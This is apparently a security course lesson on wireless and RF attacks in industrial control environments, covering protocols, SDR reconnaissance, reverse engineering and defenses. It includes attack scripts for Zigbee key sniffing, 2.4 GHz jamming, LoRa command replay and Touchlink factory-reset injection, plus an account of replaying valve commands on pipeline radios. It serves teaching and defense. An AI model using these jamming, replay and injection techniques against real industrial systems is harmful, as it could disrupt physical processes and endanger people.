Lesson 06: Wireless and RF Attacks

Lesson 06: Wireless and RF Attacks in
OT Environments
Learning Objectives
●​
●​
●​
●​
●​

Understand industrial wireless protocols (WirelessHART, ISA100.11a, Zigbee, LoRa)
Perform RF reconnaissance using Software Defined Radio (SDR)
Execute wireless attacks against ICS field devices
Analyze proprietary RF protocols in SCADA systems
Implement secure wireless deployments in OT networks

1. Industrial Wireless Protocols Overview
1.1 Why Wireless in ICS/SCADA?
Use Cases:
●​
●​
●​
●​
●​

Remote Asset Monitoring: Oil/gas pipelines, water distribution
Hazardous Environments: Chemical plants, refineries (avoid cabling)
Rotating Equipment: Vibration sensors on turbines, motors
Retrofit Applications: Adding sensors without rewiring
Temporary Monitoring: Construction, commissioning phases

Challenges:
●​
●​
●​
●​
●​

Reliability: Industrial interference (motors, welding, RF noise)
Latency: Real-time control requirements
Security: Encryption, authentication in resource-constrained devices
Battery Life: Field devices may operate for years on batteries
Range: Large industrial facilities (km range needed)

1.2 Industrial Wireless Standards
Protocol

Frequency

Range

Data
Rate

Use Case

Security

WirelessHART

2.4 GHz

100-250m

250
kbps

Process
automation

AES-128, MIC

ISA100.11a

2.4 GHz

100-200m

250
kbps

Process
monitoring

AES-128,
CCM*

Zigbee

2.4 GHz,
915 MHz

10-100m

250
kbps

Building
automation,
industrial I/O

AES-128
(optional)

LoRaWAN

915 MHz,
868 MHz

5-15 km

0.3-50
kbps

Long-range
SCADA
telemetry

AES-128

Bluetooth Low
Energy

2.4 GHz

10-100m

1
Mbps

Sensors, mobile
maintenance

AES-128 (LE
Secure
Connections)

Wi-Fi (802.11)

2.4/5 GHz

50-100m

54+
Mbps

HMI tablets, IP
cameras

WPA2/WPA3

Cellular
(4G/5G)

700-2600
MHz

km
(tower-bas
ed)

100+
Mbps

Remote SCADA Carrier security
sites

1.3 WirelessHART Deep Dive
Background:
●​
●​
●​
●​

Extension of HART (Highway Addressable Remote Transducer) protocol
IEC 62591 standard
Time-synchronized mesh networking (TDMA)
Designed for process industry

Network Architecture:
Field Devices (sensors, actuators)
↓
Mesh Network (self-forming, self-healing)
↓
Access Points (multiple for redundancy)
↓
Gateway (WirelessHART ↔ wired HART/Modbus/etc.)
↓
SCADA/DCS System
Security Features:
●​
●​
●​
●​

AES-128-CCM: Encryption + authentication
MIC (Message Integrity Code): 4-byte tag
Network Key: Shared across all devices
Session Keys: Per-device keys

●​ Join Key: For device onboarding
Packet Structure:
[Preamble][SFD][Frame Control][Dest Addr][Src Addr][Security Header][Payload][MIC]
Vulnerabilities:
●​
●​
●​
●​

Shared Network Key: Compromise one device → compromise network
Replay Attacks: If nonce/counter reused
Jamming: 2.4 GHz susceptible to interference
Rogue Access Points: Impersonate legitimate AP

1.4 ISA100.11a Deep Dive
Background:
●​
●​
●​
●​

ISA (International Society of Automation) standard
Similar to WirelessHART but more flexible
IPv6 support (6LoWPAN)
Priority-based traffic (alarm, control, monitoring)

Security:
●​ CCM Mode*: AES-128 encryption with authentication
●​ Key Management: Multiple security levels
●​ Authentication: EAP-TLS, PSK
Attack Surface:
●​ Key Extraction: From commissioning tools
●​ Protocol Downgrade: Force lower security level
●​ DoS: Flood with join requests

1.5 Zigbee in Industrial Applications
Background:
●​ IEEE 802.15.4 PHY/MAC layer
●​ Zigbee Alliance application layer
●​ Common in building automation, some industrial sensors
Network Topologies:
●​ Star: Central coordinator
●​ Tree: Hierarchical routing
●​ Mesh: Self-healing paths
Security Modes:

●​ No Security: Plaintext (legacy devices)
●​ AES-128-CCM: Encryption + MIC
●​ Trust Center: Key distribution entity
Known Vulnerabilities:
●​
●​
●​
●​

CVE-2015-5375: Zigbee Light Link key transport flaw
Insecure Default Keys: Factory default network keys
Insecure Rejoin: Devices rejoin without authentication
Replay Attacks: Weak frame counter implementation

1.6 LoRaWAN for SCADA
Background:
●​ Long Range Wide Area Network
●​ Sub-GHz ISM bands (868 MHz EU, 915 MHz US)
●​ Designed for IoT, adopted for SCADA telemetry
Architecture:
End Devices (RTUs, sensors)
↓
LoRa Gateways (multiple for coverage)
↓
Network Server (authentication, routing)
↓
Application Server (SCADA integration)
Security:
●​ AES-128: Two-layer encryption
○​ Network Session Key: Network server communication
○​ App Session Key: Application data encryption
●​ OTAA (Over-The-Air Activation): Secure device join
●​ ABP (Activation By Personalization): Pre-shared keys (less secure)
Attacks:
●​
●​
●​
●​

Replay Attacks: Frame counter manipulation
Bit-Flipping: Modify encrypted payloads (integrity not always checked)
Gateway Spoofing: Rogue gateway captures traffic
Jamming: Easy to disrupt sub-GHz signals

2. Software Defined Radio (SDR) for RF Analysis
2.1 SDR Hardware Options

Device

Frequency Range

Sample Rate

Price

Use Case

RTL-SDR

24-1766 MHz

2.4 MSPS

$25

RX only, entry-level

HackRF One

1 MHz - 6 GHz

20 MSPS

$300

TX/RX, full-duplex

USRP B200

70 MHz - 6 GHz

56 MSPS

$700

Professional SDR

LimeSDR

100 kHz - 3.8 GHz

61.44 MSPS

$300

TX/RX, open-source

BladeRF

300 MHz - 3.8 GHz

40 MSPS

$420

TX/RX, industrial

Recommendation for ICS Security:
●​ Reconnaissance: RTL-SDR (receive-only, safe)
●​ Full Analysis: HackRF One or LimeSDR (transmit capability)
●​ Production Testing: USRP (professional-grade)

2.2 GNU Radio Installation
# Ubuntu/Debian
sudo apt update
sudo apt install gnuradio gr-osmosdr
# Install SDR drivers
sudo apt install rtl-sdr hackrf libhackrf-dev
# Verify
gnuradio-companion
hackrf_info # Should detect HackRF
rtl_test # Should detect RTL-SDR

2.3 Frequency Scanning with SDR
Universal Radio Hacker (URH) - Recommended for ICS:
# Install URH
sudo apt install python3-pip
pip3 install urh
# Or from source
git clone https://github.com/jopohl/urh
cd urh
pip3 install -r requirements.txt
python3 -m urh
RTL-SDR Spectrum Scan:

# Scan 2.4 GHz ISM band (WirelessHART, Zigbee, WiFi)
rtl_power -f 2400M:2500M:100k -g 50 -i 1 -e 1h scan_2.4GHz.csv
# Visualize
python3 heatmap.py scan_2.4GHz.csv scan_2.4GHz.png
# Scan 915 MHz ISM band (LoRa, some Zigbee)
rtl_power -f 900M:930M:50k -g 50 -i 1 -e 30m scan_915MHz.csv
HackRF Spectrum Analyzer:
# Use hackrf_sweep for wideband scanning
hackrf_sweep -f 2400:2500 -w 20000000 -n 8192 > sweep_2.4GHz.csv
# Real-time spectrum display with gqrx
gqrx
# Set device: HackRF One
# Set frequency: 2450 MHz
# Set bandwidth: 20 MHz

2.4 Demodulating Industrial Wireless Protocols
Capture Zigbee Traffic (IEEE 802.15.4):
# Using Killerbee framework (Zigbee analysis)
sudo apt install python3-usb python3-crypto
git clone https://github.com/riverloopsec/killerbee
cd killerbee
sudo python3 setup.py install
# Capture Zigbee packets (requires compatible adapter: RZUSBSTICK, ApiMote)
zbdump -f zigbee_capture.pcap -c 11 # Channel 11 (2405 MHz)
# Replay captured packets
zbreplay -f zigbee_capture.pcap
# Decrypt (if you have network key)
zbdecrypt -f zigbee_capture.pcap -k 5a:69:67:42:65:65:41:6c:6c:69:61:6e:63:65:30:39
Demodulate WirelessHART (using URH):
1.​ Open URH
2.​ File → Record Signal
○​ Device: HackRF / RTL-SDR
○​ Frequency: 2.405 GHz (Channel 11)
○​ Sample Rate: 2 MSPS
○​ Modulation: O-QPSK (Offset Quadrature Phase Shift Keying)
3.​ Analyze → Interpret Protocol
4.​ Extract packet structure

LoRa Demodulation:
# Using gr-lora (GNU Radio LoRa decoder)
git clone https://github.com/rpp0/gr-lora
cd gr-lora
mkdir build && cd build
cmake ..
make
sudo make install
# Capture LoRa packets (use GNU Radio flowgraph or gr-lora examples)
# Frequency: 868 MHz (EU) or 915 MHz (US)
# Bandwidth: 125 kHz (typical)
# Spreading Factor: 7-12

3. Wireless Attack Techniques
3.1 Zigbee Key Extraction
Scenario: Extract Zigbee network key from traffic
Technique - Sniff Insecure Rejoin:
#!/usr/bin/env python3
"""
Zigbee key sniffer - captures network key during insecure rejoin
Requires: Killerbee framework, compatible Zigbee sniffer
"""
from killerbee import KillerBee
from scapy.all import *
def sniff_zigbee_key(channel=11, interface="KB0"):
kb = KillerBee(device=interface)
kb.set_channel(channel)
print(f"[*] Sniffing Zigbee channel {channel}...")
print("[*] Waiting for device rejoin or commissioning...")
while True:
packet = kb.pnext()
if packet is not None:
# Parse for transport key command (0x05)
# Network key is sent encrypted with default Zigbee TC link key
# Default key: 5a:69:67:42:65:65:41:6c:6c:69:61:6e:63:65:30:39
if b'\x05' in packet: # Transport Key command

print(f"[+] Potential key transport detected!")
print(f"Packet: {packet.hex()}")
# Decrypt using default TC link key
# (Implementation depends on Zigbee stack)
# Usage: sniff_zigbee_key()
Tool: Zigbee-crypt:
# Extract key from PCAP
git clone https://github.com/edhoedt/zigbee-crypt
python zigbee-crypt.py -f capture.pcap
# If key found, decrypt traffic
wireshark capture.pcap
# Edit → Preferences → Protocols → ZigBee
# Add decryption key

3.2 WirelessHART Jamming Attack
Selective Jamming (target specific time slots in TDMA):
#!/usr/bin/env python3
"""
WirelessHART selective jammer
WARNING: Illegal in most jurisdictions without authorization
"""
from gnuradio import gr, blocks, analog
from osmosdr import source
class WirelessHART_Jammer(gr.top_block):
def __init__(self):
gr.top_block.__init__(self)
# HackRF sink (transmit on 2.4 GHz)
self.hackrf_sink = osmosdr.sink()
self.hackrf_sink.set_sample_rate(2e6)
self.hackrf_sink.set_center_freq(2.45e9) # Channel 20
self.hackrf_sink.set_gain(20)
# Generate noise signal
self.noise_source = analog.noise_source_c(analog.GR_GAUSSIAN, 1.0)
# Connect
self.connect(self.noise_source, self.hackrf_sink)

# WARNING: For authorized testing only
# jammer = WirelessHART_Jammer()
# jammer.start()
Reactive Jamming (jam only when legitimate traffic detected):
●​ Monitor for WirelessHART preamble
●​ Transmit noise burst upon detection
●​ More efficient, harder to detect than continuous jamming

3.3 LoRaWAN Replay Attack
Scenario: Capture and replay LoRa packets (if frame counters not enforced)
#!/usr/bin/env python3
"""
LoRa packet capture and replay
Requires: HackRF One, gr-lora
"""
import socket
import time
def capture_lora_packet():
"""
Capture LoRa packet using gr-lora
Returns raw payload
"""
# Assumes gr-lora is running and outputting to UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(("127.0.0.1", 40868))
print("[*] Listening for LoRa packets...")
data, addr = sock.recvfrom(1024)
print(f"[+] Captured LoRa packet: {data.hex()}")
return data
def replay_lora_packet(payload):
"""
Replay LoRa packet
WARNING: Requires authorization
"""
# Use HackRF with gr-lora transmit flowgraph
# Transmit payload on same frequency/SF/BW
print(f"[*] Replaying packet: {payload.hex()}")
# Implementation via GNU Radio flowgraph

# Capture legitimate command packet
packet = capture_lora_packet()
# Wait for opportune moment (e.g., operator leaves site)
time.sleep(3600)
# Replay (execute unauthorized command)
replay_lora_packet(packet)
Defense:
●​ Enforce strict frame counter validation
●​ Implement application-layer timestamp verification
●​ Use OTAA instead of ABP (prevents key reuse)

3.4 Zigbee Packet Injection
Touchlink Commissioning Attack:
#!/usr/bin/env python3
"""
Zigbee Touchlink attack - factory reset bulbs/devices
CVE-2015-5375
"""
from killerbee import KillerBee
import struct
def touchlink_reset(target_channel=11):
kb = KillerBee()
kb.set_channel(target_channel)
# Zigbee Light Link Scan Request (broadcast)
scan_request = bytes.fromhex(
"0108" # Frame control
"0000" # Sequence
"ffff" # Dest PAN
"ffffffffffffffff" # Dest addr (broadcast)
"0000" # Src PAN
"0000000000000000" # Src addr
"11" # Cluster: Touchlink
"00" # Command: Scan Request
"00000000" # Transaction ID
"04" # Flags (factory new)
)
# Send scan request
kb.inject(scan_request)

print("[*] Sent Touchlink scan request")
print("[*] Listening for responses...")
# Receive scan responses (devices announce themselves)
for i in range(10):
packet = kb.pnext(timeout=1)
if packet:
print(f"[+] Response: {packet.hex()}")
# Send Reset to Factory New Request
reset_request = bytes.fromhex(
"0108"
"0100"
"ffff"
"ffffffffffffffff"
"0000"
"0000000000000000"
"11"
"07" # Command: Reset to Factory New
"00000000"
)
kb.inject(reset_request)
print("[+] Sent factory reset command")
# Usage: touchlink_reset()

3.5 WirelessHART Network Key Cracking
Scenario: Captured encrypted WirelessHART traffic, brute-force network key
Methodology:
1.​ Capture traffic with known plaintext (e.g., HART command structures)
2.​ Extract MIC (Message Integrity Code)
3.​ Brute-force AES-128 key using known plaintext/MIC
Challenges:
●​ AES-128 has 2^128 keyspace (infeasible to brute-force)
●​ Requires weak key (e.g., default key, sequential, derived from device serial)
Realistic Attack Vector:
●​ Physical Access: Extract key from commissioning handheld
●​ Supply Chain: Compromise commissioning tool software
●​ Side-Channel: Power analysis during key operation

4. Proprietary RF Protocols
4.1 Reverse Engineering Proprietary Protocols
Scenario: Industrial site uses proprietary RF for telemetry
Reverse Engineering Process:
Step 1: Capture Signals
# Wideband scan to identify frequency
hackrf_sweep -f 300:900 -w 20000000 > sweep.csv
# Identify active frequency (e.g., 433.92 MHz)
# Capture IQ samples
hackrf_transfer -r capture_433MHz.iq -f 433920000 -s 2000000 -g 20 -l 32 -a 1 -n 10000000
Step 2: Analyze in URH (Universal Radio Hacker)
1.​ Open URH
2.​ File → Open IQ File → capture_433MHz.iq
3.​ URH auto-detects modulation (ASK, FSK, PSK)
4.​ Interpret → View as protocol
5.​ Label fields (preamble, address, command, data, CRC)
Step 3: Demodulate
# Example: ASK OOK demodulation
from scipy import signal
import numpy as np
def demodulate_ask(iq_samples, sample_rate):
# Compute magnitude (envelope detection)
magnitude = np.abs(iq_samples)
# Low-pass filter
b, a = signal.butter(5, 100000, fs=sample_rate)
filtered = signal.filtfilt(b, a, magnitude)
# Threshold
threshold = np.mean(filtered)
bits = (filtered > threshold).astype(int)
return bits
# Load IQ file
iq_data = np.fromfile("capture_433MHz.iq", dtype=np.complex64)
bits = demodulate_ask(iq_data, sample_rate=2e6)

Step 4: Decode Protocol
# Example: Identify packet structure
def find_preamble(bits, preamble="10101010"):
preamble_bits = [int(b) for b in preamble]
matches = []
for i in range(len(bits) - len(preamble_bits)):
if list(bits[i:i+len(preamble_bits)]) == preamble_bits:
matches.append(i)
return matches
# Find packets
packets = find_preamble(bits)
print(f"Found {len(packets)} potential packets")
# Extract first packet
if packets:
packet_start = packets[0]
packet_bits = bits[packet_start:packet_start+200] # Assume 200-bit packet
print(f"Packet bits: {packet_bits}")
Step 5: Test Hypothesis
●​ Vary inputs (e.g., press button 1, button 2, etc.)
●​ Observe differences in captured packets
●​ Map bits to functions
Step 6: Craft Custom Packets
def generate_packet(device_id, command):
"""
Generate custom packet for proprietary protocol
"""
preamble = "10101010"
device_bits = format(device_id, '08b')
command_bits = format(command, '08b')
crc = calculate_crc([device_id, command]) # Implement based on analysis
packet = preamble + device_bits + command_bits + format(crc, '08b')
return packet
# Transmit using HackRF
def transmit_ask(packet_bits, frequency=433.92e6):
# Convert bits to IQ samples
# Transmit via HackRF
pass

4.2 Case Study: Reverse Engineering SCADA Radio
Real-World Example: Oil pipeline SCADA using 900 MHz FSK radios
Captured Signal Analysis:
●​
●​
●​
●​

Frequency: 902-928 MHz (FCC Part 15.247)
Modulation: 2-FSK (Frequency Shift Keying)
Baud Rate: 9600 bps
Packet Structure: [Preamble 0xAA 0xAA][Sync 0x7E][Length][Src Addr][Dst
Addr][Payload][CRC-16]

Attack Developed:
●​ Capture commands sent from SCADA master to RTUs
●​ Identify "Open Valve" command structure
●​ Replay attack to remotely open valves
Mitigation (post-discovery):
●​
●​
●​
●​

Implement sequence numbers
Add timestamp validation
Encrypt payloads (AES-128)
Enable message authentication codes

5. Defensive Measures
5.1 Wireless ICS Security Best Practices
Network Architecture:
1.​ Separate Wireless from Wired: Dedicated VLAN/subnet for wireless sensors
2.​ Wireless Gateway Hardening: Firewall rules, disable unused services
3.​ Intrusion Detection: RF monitoring for rogue devices
4.​ Physical Security: Secure access points in locked cabinets
Encryption & Authentication:
●​
●​
●​
●​

Always Enable Encryption: Even if standard allows optional encryption
Change Default Keys: Network keys, join keys, passwords
Certificate-Based Auth: For high-security applications (WPA2-Enterprise)
Regular Key Rotation: Rotate network keys quarterly

Monitoring:
●​
●​
●​
●​

RF Spectrum Monitoring: Detect jamming, rogue devices
Protocol Anomaly Detection: Unexpected commands, rates
Device Inventory: Maintain MAC address whitelist
Alert on New Devices: Auto-detect unauthorized joins

5.2 RF Intrusion Detection
Kismet for Industrial Wireless:
# Install Kismet
sudo apt install kismet
# Configure for Zigbee/802.15.4
sudo kismet -c <zigbee_interface>
# Web UI at http://localhost:2501
# View detected devices, SSIDs, anomalies
Custom RF Monitoring:
#!/usr/bin/env python3
"""
RF monitoring for WirelessHART network
Alerts on unauthorized devices or jamming
"""
from killerbee import KillerBee
import hashlib
authorized_devices = [
"00:12:4b:00:01:23:45:67",
"00:12:4b:00:89:ab:cd:ef"
]
def monitor_wireless_network(channel=11):
kb = KillerBee()
kb.set_channel(channel)
print(f"[*] Monitoring channel {channel} for unauthorized devices...")
while True:
packet = kb.pnext()
if packet:
# Extract source address
src_addr = extract_src_address(packet)
if src_addr not in authorized_devices:
print(f"[!] ALERT: Unauthorized device detected: {src_addr}")
# Send alert (email, SIEM, etc.)
# Detect jamming (excessive corrupted packets)
if is_corrupted(packet):
print(f"[!] ALERT: Potential jamming detected")

def extract_src_address(packet):
# Parse IEEE 802.15.4 packet
# Source address at offset 7-14 (for long addressing)
return packet[7:15].hex()
def is_corrupted(packet):
# Check FCS (Frame Check Sequence)
# Return True if invalid
return False # Simplified
# Usage: monitor_wireless_network()

5.3 Wireless Penetration Testing Checklist
Pre-Engagement:
●​
●​ Prepare rollback plan (restore connectivity if issues)
Reconnaissance:
●​
●​ Signal strength mapping (coverage areas)
Vulnerability Assessment:
●​
●​ Jamming susceptibility (controlled test)
Exploitation (authorized only):
●​
●​ Man-in-the-middle (MITM)
Reporting:
●​
●​ Demonstrate business impact

6. Hands-On Lab Exercises
Lab 1: RF Spectrum Analysis
1.​ Install RTL-SDR and GNU Radio
2.​ Scan 2.4 GHz ISM band
3.​ Identify Wi-Fi, Bluetooth, Zigbee signals
4.​ Capture and analyze one protocol in URH

5.​ Document frequency, modulation, baud rate

Lab 2: Zigbee Packet Capture
1.​ Set up Killerbee framework with compatible hardware
2.​ Capture Zigbee traffic (smart home devices acceptable for learning)
3.​ Analyze packets in Wireshark
4.​ Attempt to extract network key (if using test devices with known keys)
5.​ Decrypt traffic

Lab 3: LoRa Demodulation
1.​ Install gr-lora in GNU Radio
2.​ Capture LoRa packets (requires LoRa transmitter or LoRaWAN gateway nearby)
3.​ Demodulate and decode packets
4.​ Identify frame structure (header, payload, CRC)
5.​ Analyze security (encrypted? frame counter enforced?)

Lab 4: Proprietary Protocol Reverse Engineering
1.​ Use HackRF to capture unknown RF signal (433 MHz remote control, garage door,
etc.)
2.​ Analyze in URH
3.​ Identify modulation type
4.​ Decode protocol structure
5.​ Craft custom packet and replay (authorized device only)

7. Tools & Resources
SDR Hardware
●​ RTL-SDR: https://www.rtl-sdr.com/
●​ HackRF One: https://greatscottgadgets.com/hackrf/
●​ LimeSDR: https://limemicro.com/products/boards/limesdr/

Software
●​
●​
●​
●​
●​

GNU Radio: https://www.gnuradio.org/
Universal Radio Hacker: https://github.com/jopohl/urh
Killerbee (Zigbee): https://github.com/riverloopsec/killerbee
gr-lora: https://github.com/rpp0/gr-lora
Kismet: https://www.kismetwireless.net/

Documentation
●​ WirelessHART Spec: IEC 62591
●​ ISA100.11a Spec: ISA100.11a-2011

●​ Zigbee Spec: https://zigbeealliance.org/
●​ LoRaWAN Spec: https://lora-alliance.org/resource_hub/lorawan-specification-v1-1/

Research Papers
●​ "Security Analysis of WirelessHART" (Wright et al.)
●​ "Practical Attacks on Zigbee Networks" (Olawumi et al.)
●​ "LoRaWAN Security: Current State and Future Directions"

8. Knowledge Check
1.​ What are the primary industrial wireless protocols and their use cases?
2.​ Why is WirelessHART designed with mesh networking?
3.​ What are the security mechanisms in WirelessHART (encryption, keys, MIC)?
4.​ How would you perform RF reconnaissance using an SDR?
5.​ Describe the Zigbee Touchlink attack (CVE-2015-5375).
6.​ What is the difference between OTAA and ABP in LoRaWAN?
7.​ How can you detect wireless jamming attacks?
8.​ What are the steps to reverse engineer a proprietary RF protocol?
9.​ Why is changing default network keys critical in industrial wireless?
10.​What defensive measures mitigate wireless attacks in OT environments?
Obtain written authorization
Define scope (frequencies, protocols, locations)
Coordinate with operations (RF testing can disrupt)
Spectrum scan (identify active frequencies)
Protocol identification (WirelessHART, Zigbee, proprietary)
Device enumeration (MAC addresses, vendors)
Test for default credentials
Encryption enabled? (capture plaintext if not)
Key extraction attempts
Authentication bypass tests
Packet injection (unauthorized commands)
Replay attacks
Rogue access point (evil twin)

Document findings with risk ratings
Provide remediation recommendations
Include packet captures as evidence

